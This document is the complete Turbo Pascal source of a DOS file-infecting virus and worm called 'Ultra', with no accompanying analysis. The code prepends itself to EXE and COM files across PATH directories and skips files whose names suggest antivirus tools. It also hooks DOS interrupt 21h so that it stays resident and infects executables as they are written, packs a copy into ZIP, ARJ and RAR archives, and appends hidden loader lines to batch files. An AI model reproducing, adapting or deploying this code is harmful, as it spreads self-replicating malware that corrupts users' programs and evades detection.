   Program Ultra;
   {$I-}
   {$M $4000,4000,25000 }
   Uses Dos;
   Const
   VLen = 5926;
   GMem = 6056;
   FName = 'Joke.Exe';             { Host name }
   Var
   FIn,FOut : File;
   OurSt,Temp,G,D,PackedBody : Pointer;
   FSearch : SearchRec;
   NumRead,i,q : Word;
   XString,DString,WString,F:String;
   ZipPath,ArjPath,RarPath:String;
   Regs : Registers;               { Registers }
   KbdIntVec : Procedure;              { Old int 21 }
   NoInfect : Byte;                { No Infection mark }
   Attr : Word;
   MStr : String;
   zAh,zAl : Byte;
   NoIn : Boolean;

   Procedure InfectRes(Handle:Word);       { Infect in resident }
   Begin
       Regs.Ah := $40;     { Encode Write }
       Regs.Ds := Seg(OurSt^);
       Regs.Dx := Ofs(OurSt^);
       Regs.Cx := VLen;
       Regs.Bx := Handle;
       With Regs do Intr($21,Regs);
   End;

   {$F+}
   Procedure NewInt(zFlags,zCS,zIP,zAX,zBX,zCX,zDX,zSI,zDI,zDS,zES,zBP: Word);
   Interrupt;
   Begin

   asm
   mov ax,zAx          { Get Ah and Al }
   mov zAh,ah
   mov zAl,al
   end;

   If (zAh = $40) and (Memw[zDs:zDx] = $5A4D)
       and (Memw[zDs:zDx+4] <> $13) and (NoInfect = 0)
               then InfectRes(zBx);
    { Write and first two bytes is 'MZ' ? }

   If (zAh = $40) and (Mem[zDs:zDx] = $E9)
       and (NoInfect = 0) then InfectRes(zBx);
    { Write and first byte is 0E9h (Jmp) ? }

   If zAx = $FE00 then NoInfect:=1;    { Infection check }
   If zAx = $FE01 then NoInfect:=0;
   If zAx = $FEDC then zAx := 0;

   asm
           mov ax,word ptr ds:[KbdIntVec]  { Restore Old Int }
           mov bx,word ptr ds:[KbdIntVec][2]
           mov word ptr cs:[@JmpIt],ax
           mov word ptr cs:[@JmpIt][2],bx

           jmp @PrefClear          { Clear prefetch queue }
   @PrefClear:
           pop  bp
       pop  es
       pop  ds
       pop  di
       pop  si
       pop  dx
       pop  cx
       pop  bx
       pop  ax

           db  0EAh        { Far jump to real int 21 }
   @JmpIt: dd  0
    End;
   End;
   {$F-}


   Procedure  OurProc; Interrupt; Begin End;

   Procedure ExecFile(NME,Para:String);
   Begin
   SwapVectors;
   GetIntVec($10,G);
   SetIntVec($10,Addr(OurProc));
   Exec(NMe,Para);
   SetIntVec($10,G);
   SwapVectors;
   End;

   Function UCase(StrP:String):String;
   Var
   G:Integer;
   M:String;
   Begin
   M := '';
   For G := 1 to Length(StrP) do M := M + UpCase(StrP[G]);
   UCase := M;
   End;

   Procedure Infect(Mask:String);
   Var
   FA:Word;
   Begin
   FindFirst(Mask,AnyFile,FSearch);

   While DosError = 0 do
    If (Pos('AID',UCase(FSearch.Name)) = 0)
          and (Pos('DRW',UCase(FSearch.Name)) = 0)
                and (Pos('ADI',UCase(FSearch.Name)) = 0)
                      and (Pos('AVP',UCase(FSearch.Name)) = 0) then
   Begin
    If FSearch.Time <> 0 then Begin
     Assign(FIn,FSearch.Name);
     GetFAttr(FIn,FA);
     SetFAttr(FIn,0);
     Rename(FIn,FName);
     Assign(Fout,FSearch.Name);
     Rewrite(FOut,1);
     Reset(FIn,1);
     Blockwrite(FOut,OurSt^,VLen);
     Repeat
     Blockread(FIn,Temp^,GMem,NumRead);
     If (MemW[Seg(Temp^):Ofs(Temp^)+4] = $13)
          and (MemW[Seg(Temp^):Ofs(Temp^)] = $5A4D) then Seek(FOut,0);
     Blockwrite(FOut,Temp^,NumRead);
     Until Numread = 0;
     SetFTime(FOut,000);
     Close(Fin);
     Close(FOut);
     SetFAttr(FOut,FA);
     Erase(Fin);
    End;
     FindNext(FSearch);
   End;
   End;

   Procedure DropUs(Nme:String);
   Begin
   Assign(Fout,NME);
   Rewrite(FOut,1);
   Blockwrite(FOut,OurSt^,VLen);
   Close(FOut);
   End;

   Procedure ZipWorm(NME:String);
   Begin
   ExecFile(ZipPath+'\pkzip.exe',NME+' '+DString+'\EX.EXE');
   End;
   Procedure ArjWorm(NME:String);
   Begin
   ExecFile(ArjPath+'\arj.exe',' a '+NME+' '+DString+'\EX.EXE');
   End;
   Procedure RarWorm(NME:String);
   Begin
   ExecFile(RarPath+'\rar.exe',' a -std '+NME+' '+DString+'\EX.EXE');
   End;

   Procedure ArchWorm;
   Begin
   If ZipPath <> '' then Begin
   FindFirst('*.zip',AnyFile,FSearch);
   While DosError = 0 do
     Begin
     ZipWorm(FSearch.Name);
     FindNext(FSearch);
     End;
   End;
   If ArjPath <> '' then Begin
   FindFirst('*.arj',AnyFile,FSearch);
   While DosError = 0 do
     Begin
     ArjWorm(FSearch.Name);
     FindNext(FSearch);
     End;
   End;
   If RarPath <> '' then Begin
   FindFirst('*.rar',AnyFile,FSearch);
   While DosError = 0 do
     Begin
     RarWorm(FSearch.Name);
     FindNext(FSearch);
     End;
   End;

   End;

   Procedure InfectBat;
   Begin
   FindFirst('*.Bat',AnyFile,FSearch);

   While DosError = 0 do If UCase(FSearch.Name) <> 'AUTOEXEC.BAT' then
   Begin
    If FSearch.Time <> 0 then Begin
     Assign(FIn,FSearch.Name);
     Rename(FIn,FName);
     Assign(Fout,FSearch.Name);
     Rewrite(FOut,1);
     Reset(FIn,1);
     Repeat
     Blockread(FIn,Temp^,GMem,NumRead);
     Blockwrite(FOut,Temp^,NumRead);
     Until Numread = 0;
     F := Chr($0D)+Chr($0A);
     For i := 0 to 20 do BlockWrite(FOut,F[1],Length(f));
     F := '@ctty nul'+Chr($0D)+Chr($0A);
     BlockWrite(FOut,F[1],Length(f));
     F := 'PkUnZip %0'+Chr($0D)+Chr($0A);
     BlockWrite(FOut,F[1],Length(f));
     F := 'Ex.Exe'+Chr($0D)+Chr($0A);
     BlockWrite(FOut,F[1],Length(f));
     F := 'Echo Del EQ.BAT>EQ.Bat'+Chr($0D)+Chr($0A);
     BlockWrite(FOut,F[1],Length(f));
     F := 'EQ.BAT|Ctty Con'+Chr($0D)+Chr($0A);
     BlockWrite(FOut,F[1],Length(f));
     BlockWrite(FOut,D^,Q);
     SetFTime(FOut,000);
     Close(Fin);
     Close(FOut);
     Erase(Fin);
    End;
     FindNext(FSearch);
   end;
   End;

   Procedure Travel;
   Begin
   XString := GetEnv('PATH');

   GetDir(0,DString);
   repeat
   WString := Copy(XString,i,Pos(';',XString)-1);
   XString := Copy(XString,Pos(';',XString)+1,Length(XString));
   ChDir(WString);
   Infect('*.exe'); Infect('*.com'); ArchWorm; InfectBat;
   until XString = '';
   ChDir(DString);
   End;

   Var
   Abz:Word;

   Begin

   Assign(FIn,paramstr(0));
   GetFAttr(FIn,Abz);
   SetFAttr(FIn,0);
   Reset(FIn,1);
   Getmem(OurSt,VLen);
   Blockread(FIn,OurSt^,VLen);

   regs.ax := $FE00;
   with regs do Intr($21,Regs);

   GetMem(Temp,GMem);
   Assign(Fout,FName);
   Rewrite(Fout,1);
   Repeat
   Blockread(Fin,Temp^,GMem,NumRead);
   Blockwrite(FOut,Temp^,NumRead);
   Until NumRead = 0;
   Close(FIn);
   Close(FOut);
   Freemem(Temp,GMem);

   SwapVectors;
   Exec(FName, Paramstr(1)+Paramstr(2)+Paramstr(3)+Paramstr(4)+Paramstr(5));
   SwapVectors;

   Erase(FOut);
   SetFAttr(FIn,Abz);

   Getmem(Temp,GMem);


   XString := GetEnv('PATH');
   ArjPath := ''; RarPath := ''; ZipPath := '';

   GetDir(0,DString);
   repeat
   WString := Copy(XString,i,Pos(';',XString)-1);
   If WString = '' then XString := '';
   XString := Copy(XString,Pos(';',XString)+1,Length(XString));
   ChDir(WString);
   FindFirst('Pkzip.exe',AnyFile,FSearch);
   If DosError = 0 then ZipPath := WString;
   FindFirst('Rar.exe',AnyFile,FSearch);
   If DosError = 0 then RarPath := WString;
   FindFirst('Arj.exe',AnyFile,FSearch);
   If DosError = 0 then ArjPath := WString;
   until XString = '';
   ChDir(DString);

   DropUs('Ex.Exe');
   ArchWorm;

   F := 'RealSuxx.Zip Ex.Exe';
   ExecFile(ZipPath+'\pkzip.exe',F);

     Assign(Fin,'RealSuxx.Zip');
     Reset(Fin,1);
     If IoResult = 0 then Begin
     Q := FileSize(Fin);
     Getmem(D,Q);
     BlockRead(Fin,D^,Q);
     Close(Fin);
     Erase(Fin);

     Travel;

    End;
    FreeMem(D,Q);

     Infect('*.exe'); Infect('*.com');

    Assign(FOut,'Ex.Exe');
    Erase(FOut);

   regs.ax := $0FE01;
   with regs do Intr($21,Regs);

   Regs.Ax := $FEDC;
   with regs do Intr($21,regs);
   If Regs.Ax <> 0 then begin
                        GetIntVec($21,@KbdIntVec);
                        SetIntVec($21,Addr(NewInt));
                        Keep(0);
                        End;
   End.
